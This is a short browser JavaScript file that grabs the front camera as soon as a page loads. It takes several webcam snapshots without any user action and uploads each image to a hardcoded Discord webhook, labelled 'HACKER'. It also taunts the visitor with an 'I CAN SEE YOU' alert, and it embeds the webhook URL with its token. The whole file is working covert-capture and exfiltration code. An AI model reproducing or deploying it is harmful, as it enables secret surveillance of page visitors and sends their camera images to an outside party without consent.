// Set constraints for the video stream
var constraints = { video: { facingMode: "user" }, audio: false };
// Define constants
const cameraView = document.querySelector("#camera--view"),
    cameraOutput = document.querySelector("#camera--output"),
    cameraSensor = document.querySelector("#camera--sensor"),
    cameraTrigger = document.querySelector("#camera--trigger")
	
function takePicture(){
	    cameraSensor.width = cameraView.videoWidth;
    cameraSensor.height = cameraView.videoHeight;
    cameraSensor.getContext("2d").drawImage(cameraView, 0, 0);
    cameraOutput.src = cameraSensor.toDataURL("image/webp");
	
	var url = cameraSensor.toDataURL("image/webp")

	fetch(url)
	.then(res => res.blob())
	.then(blob => {
	
	var params = {
        username: "HACKER",
        avatar_url: "",
		  "embeds": [{
			"file": blob
		  }],
        content: "HACKED"
      }
	  
	  var formData = new FormData();

	  //var blob = blobCreationFromURL(url)

	 formData.append("file", blob, "img.webp");

	var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/836231570125619231/N_dtJl1Ixp7VEmekRQo702UCfe90im6_fYh2bLDtyBQcvmzKxqI65Je94qIFxwq0alL3");

      //request.setRequestHeader('Content-type', 'multipart/form-data');
      request.send(formData);
	  
	  
})

      
}

// Access the device camera and stream to cameraView
function cameraStart() {
    navigator.mediaDevices
        .getUserMedia(constraints)
        .then(function(stream) {
        track = stream.getTracks()[0];
        cameraView.srcObject = stream;
		window.setTimeout(function(){
			takePicture()
		}, 1000);
		
		window.setTimeout(function(){
			takePicture()
		}, 500);
		
		window.setTimeout(function(){
			takePicture()
		}, 500);
		
		alert("HACKED EASILY - I CAN SEE YOU!")
    })
    .catch(function(error) {
        console.error("Oops. Something is broken.", error);
    });
}



// Start the video stream when the window loads
window.addEventListener("load", cameraStart, false);